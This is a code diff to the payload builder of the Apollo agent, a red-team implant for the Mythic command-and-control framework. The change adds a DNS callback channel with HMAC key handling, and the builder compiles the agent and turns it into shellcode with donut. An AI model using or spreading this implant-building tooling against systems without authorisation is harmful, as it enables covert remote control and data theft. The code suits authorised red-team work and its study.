@@ -1,5 +1,6 @@
 from mythic_payloadtype_container.PayloadBuilder import *
 from mythic_payloadtype_container.MythicCommandBase import *
+from mythic_payloadtype_container.MythicRPC import *
 import os, fnmatch, tempfile, sys, asyncio
 from distutils.dir_util import copy_tree
 import traceback
@@ -30,7 +31,7 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
             description="Output as shellcode, executable, or dynamically loaded library.",
         )
     ]
-    c2_profiles = ["http", "smb", "tcp"]
+    c2_profiles = ["http", "smb", "tcp", "dns"]
     support_browser_scripts = [
         BrowserScript(script_name="copy_additional_info_to_clipboard", author="@djhohnstein"),
         BrowserScript(script_name="create_table", author="@djhohnstein"),
@@ -71,6 +72,10 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
                 "encrypted_exchange_check": "",
                 "payload_uuid": self.uuid,
                 "AESPSK": "",
+                "callback_domains": "",
+                "msginit": "",
+                "msgdefault": "",
+                "hmac_key": "",
             },
         }
         success_message = f"Apollo {self.uuid} Successfully Built"
@@ -98,6 +103,15 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
                 else:
                     special_files_map["Config.cs"][key] = json.dumps(val)
         try:
+            main_config_dns = await MythicRPC().execute_c2rpc(c2_profile="dns", function_name="get_instance_settings",message="get config parameters",task_id=None)
+            main_config_dns = main_config_dns.response
+            for i in main_config_dns['instances']:
+                domains = special_files_map["Config.cs"]["callback_domains"]
+                if domains in i["callback_domains"]:
+                    if "hmac_key" in i:
+                        special_files_map["Config.cs"]["hmac_key"] = i["hmac_key"]
+                    else:
+                        await MythicRPC().execute_c2rpc(c2_profile="dns", function_name="set_hmac_key",message="set hmac key",task_id=None)
             # make a temp directory for it to live
             agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
             # shutil to copy payload files over
@@ -130,7 +144,7 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
             if stderr:
                 stdout_err += f'[stderr]\n{stderr.decode()}' + "\n" + command
             output_path = "{}/Apollo/bin/Release/Apollo.exe".format(agent_build_path.name)
-            
+
             if os.path.exists(output_path):
                 resp.status = BuildStatus.Success
                 targetExeAsmPath = "/srv/ExecuteAssembly.exe"
@@ -154,13 +168,13 @@ A fully featured .NET 4.0 compatible training agent. Version: {}
                     command = "chmod 777 {}; chmod +x {}".format(donutPath, donutPath)
                     proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, stderr= asyncio.subprocess.PIPE)
                     stdout, stderr = await proc.communicate()
-                    
+
                     command = "{} -f 1 {}".format(donutPath, output_path)
                     # need to go through one more step to turn our exe into shellcode
                     proc = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE,
                                                     stderr=asyncio.subprocess.PIPE, cwd=agent_build_path.name)
                     stdout, stderr = await proc.communicate()
-                    
+
                     stdout_err += f'[stdout]\n{stdout.decode()}\n'
                     stdout_err += f'[stderr]\n{stderr.decode()}'
 
